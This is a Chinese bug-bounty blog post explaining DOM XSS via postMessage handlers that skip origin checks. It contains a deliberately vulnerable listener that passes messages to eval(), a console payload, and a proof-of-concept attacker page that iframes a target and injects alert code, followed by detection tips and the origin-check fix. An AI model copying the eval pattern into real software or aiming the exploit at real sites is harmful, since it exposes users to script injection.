---
title: 垃圾洞，在SRC捡了1w赏金。
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496201&idx=1&sn=dcccf8ea2ae5b804d42b76dddf4b2b7d&chksm=e8a5f86adfd2717cf018a601dcea8339ad42c65a1384e05ff2688d08a923c218c42ee466ce97&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-10-24
fetch_date: 2025-10-06T18:53:52.152218
---

# 垃圾洞，在SRC捡了1w赏金。

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj6T9fA9paduVIicnJYmPUrdrh9KFTaNBglWEFz2MHdxGNDGULwJoadYbHIlHUyf12A866hZ0hMPmHA/0?wx_fmt=jpeg)

# 垃圾洞，在SRC捡了1w赏金。

迪哥讲事

以下文章来源于森柒柒
，作者Captain0X

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7AIIn2yTEpgc5vOHF4TvXBhNCibyULzCP7oxoYzcZEUZQ/0)

**森柒柒**
.

分享知识，让一个人的快乐变成一群人的快乐！

这大概是闭关前的最后一更了，周五的夜色悄悄来临，借着公司的余光，我敲出这一篇推文，给大家分享比较另类但却小众的漏洞。

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

**正文**

这次的主题是postMessage未验证消息来源origin，导致恶意代码注入的dom-xss，由于很少人关注这类型的注入，因为挖掘难度中等，需要一定的javascript代码审计能力，且漏洞危害等级不高，导致国内许多SRC都存在跨域消息传输xss注入漏洞。比较小型的SRC会忽略，但大型的SRC会收此类漏洞，我去年挖到最高赏金的是1250软妹币，对于xss级别漏洞来说，奖励还算厚道。

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

**什么是postMessage?**

GPT是这样回答的

![](https://mmbiz.qpic.cn/mmbiz_png/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9r4nSCWDvicgoTx0QkpuIF9VnDBVpwpVDnsCzR1NLOblaffOoDfxsUMQ/640?wx_fmt=png)

Ai就是Ai，解释莫得感情，可能有点抽象，我来盘活一下。

先上简单的demo1.html

```
<html><title>dom-xss show time</title><body>
<h1>演示</h1>
<script>// 接收方页面window.addEventListener("message", function(event) {  console.log("有人约我了！他对我说:",event.data)    var message = event.data;    eval(message)});</script></body></html>
```

这段代码添加了message事件监听功能，其作用就是监听来自其他域的消息，并且使用eval方法处理这条消息。

**应用场景：**

a.com和b.com属于不同域，现在需要在a.com下面嵌套b.com的页面，并且实现消息传输，传什么消息呢？比如，a.com告诉b.com跳转到b.com的登录页面，这时候postMessage就派上用场了。

![](https://mmbiz.qpic.cn/mmbiz_jpg/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9ib7FKUqaggHChJgia8JwnHaOwKeibQftNQYWsEnGhcRLyiaDg9TficpibocQ/640?wx_fmt=jpeg)

原理你可能看得有点烦，现在直接教你如何挖掘这种漏洞。

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

**漏洞复现**

1.打开demo1.html，打开浏览器的F12，在eval(message)这行代码这里打上断点，console输入代码：postMessage("alert('靓仔')","\*")

![](https://mmbiz.qpic.cn/mmbiz_jpg/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9op4nWYOaJPNsu9trf5usiaQeZaryXgCpniaT196CeSjNF2obyOsqhxmg/640?wx_fmt=jpeg)

此时补充下postMessage的参数含义：

```
postMessage(message, targetOrigin)
```

一般只需要修改message和targetOrigin两个参数，targetOrigin为星号的时候表示不指定消息接收的origin，通配所有域。

![](https://mmbiz.qpic.cn/mmbiz_jpg/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9S3YkbJB2Sc6NGgD027DnEt9pEQrYXp2PsQowS9pXkYcTQkycVb7qvg/640?wx_fmt=jpeg)

输入代码后摁回车，此时断点卡住，message事件收到message并执行eval，弹窗。

![](https://mmbiz.qpic.cn/mmbiz_jpg/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9GWpGALB1wp9DvvdBcC4AaFKqYSF3vnLEICUBEy8W9JS378ocCbGuxQ/640?wx_fmt=jpeg)

有人会讲，这不是self-xss吗？

其实有src的审核曾经把这个当做self-xss，可能是没见过，我们上一个exp:

**攻击场景：**

https://attacker.captainxu.repl.co，用来挂载exp，代码如下：

```
<!DOCTYPE html>
<head>  <meta charset="utf-8">  <meta name="viewport" content="width=device-width">  <title>攻击站点</title>  <link href="style.css" rel="stylesheet" type="text/css" /></head><h1>Exp页面</h1>
<body>  <iframe id="target"></iframe>
  <script>    var target = document.getElementById("target");    target.addEventListener('load', () => {      target.contentWindow.postMessage('alert("靓仔")', '*')    })
    target.src = "https://target.captainxu.repl.co"</script></body>
</html>
```

https://target.captainxu.repl.co，存在漏洞的网站
代码如下：

```
<html><title>dom-xss show time</title>
<body>
  <h1>漏洞网站</h1>
  <script>    // 接收方页面    window.addEventListener("message", function (event) {      console.log("有人约我了！他对我说:", event.data)      var message = event.data;      eval(message)    });</script></body>
</html>
```

上面的效果就是attacker使用iframe嵌套target站点，然后attacker通过postMessage向target实现恶意代码注入。

![](https://mmbiz.qpic.cn/mmbiz_jpg/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9E2XjCgibY24iblmHhxf5ibyCM9fpx6mnAtoico9Wne2POicOhlByYQic3STw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

**漏洞挖掘技巧**

如何去挖这种隐藏比较深的漏洞，这里强推一个国外白帽写的谷歌浏览器插件：
https://github.com/fransr/postMessage-tracker
安装之后，只要是当前页面创建了message事件监听，这个插件就会定位到其代码。

![](https://mmbiz.qpic.cn/mmbiz_jpg/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9D6mT76VO9Hvx2OmEyEkmNtkZcjpuyHCDccJrCJDCDOXVF116F0IDCg/640?wx_fmt=jpeg)

但是请记住一点，插件只是辅助，并不能直接找到漏洞，漏洞的挖掘还是得需要去审计javascript代码。

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

**漏洞防护**

漏洞防护也比较简单，一般都是验证消息来源的origin，比如a.com的源码中只接收b.com的消息，不是b.com发来的消息不进行任何处理。如下图

![](https://mmbiz.qpic.cn/mmbiz_png/5ddaqXIIpunvk6VD9hCNQkjqBwgAMjO9KSxJJniblBRp5UxUIA1EjSzpVw5eIukI2qKic541X4GzYicma2libOrZ4w/640?wx_fmt=png)

看到验证origin的可以直接忽略，有时也会存在绕过，具体情况具体分析。

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

**思路升级**

曾经思考，这种类型的漏洞，能不能批量检测？

答案当然是可以的。

不过需要使用到高阶的javascript语法树(AST)去实现。我写过插件，效果并不是很明显，于是我想了另一个方法，那就是使用正则表达式简单粗暴地去检测源码中是否存在message这个关键词，如果存在，再人工进行核实。这种方法常常能发现意外收获。

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

##

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

##

## 福利视频

笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品

https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374

## 技术交流

技术交流请加笔者微信:richardo1o1 (暗号:growing)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过